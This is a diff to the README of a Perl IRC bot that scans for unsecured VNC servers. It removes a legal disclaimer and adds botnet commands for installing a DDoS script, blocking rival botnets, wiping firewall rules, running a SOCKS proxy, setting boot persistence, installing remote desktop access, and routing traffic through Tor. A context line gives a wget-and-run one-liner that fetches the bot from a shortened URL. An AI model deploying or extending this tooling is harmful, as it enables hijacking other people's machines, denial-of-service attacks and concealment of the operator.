@@ -1,7 +1,3 @@
-# I am not responsible for any actions you make with this program.
-# You will not use this program to commit illegal crimes.
-# You take entire responsability if you damage your or someone else's computer.
-
 This code is an IRC BOT that can connect to an IRC server with SSL
 The main purpose of this bot is to scan for Open/Unsecured VNC servers.
 
@@ -22,4 +18,17 @@ wget https://is.gd/perlvncbot && sh perlvncbot
 @.exploit 
 # This kills the exploit run
 @.stopexploit 
-
+# This installs ddos.py on the root account
+@.ddos
+# This blocks botnets from scanning your bots
+@.blocknoobs
+# This resets the iptables firewall to initial state and deletes all the rules that were made to it
+@.fwreset
+# This runs a socks5 server on port 1080
+@.socks
+# This updates the autorun of the bot on boot 
+@.autorun
+# This installs a xfce4 remote desktop on a random port accessible by your browser (tested working on debian)
+@.novnc
+# This installs proxychains and tor socks and hides the bot behind a tor node before connecting your server
+@.cloak
